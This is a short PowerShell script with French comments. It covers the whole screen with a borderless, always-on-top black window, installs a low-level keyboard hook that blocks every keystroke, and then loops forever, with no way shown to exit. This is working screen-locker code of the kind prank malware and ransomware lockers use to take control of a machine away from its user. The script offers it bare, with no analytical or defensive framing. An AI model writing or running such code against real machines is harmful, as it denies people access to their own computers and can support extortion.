Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$form = New-Object System.Windows.Forms.Form
$form.Size = New-Object System.Drawing.Size(1920, 1080)
$form.StartPosition = "Manual"
$form.Location = New-Object System.Drawing.Point(0, 0)
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::Black
$form.Show()
$form.Focus()

# Définition du hook clavier
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class KeyboardHook {
    private static IntPtr hookId = IntPtr.Zero;
    private static HookProc hookProc;
    public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void Start() {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            hookProc = HookCallback;
            hookId = SetWindowsHookEx(13, hookProc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (wParam == (IntPtr)0x100 || wParam == (IntPtr)0x101)) {
            return (IntPtr)1; // Bloque la touche
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    public static void Stop() {
        UnhookWindowsHookEx(hookId);
    }
}
"@

[KeyboardHook]::Start()

# Boucle infinie pour garder le script actif
while ($true) {
    Start-Sleep -Seconds 10
}
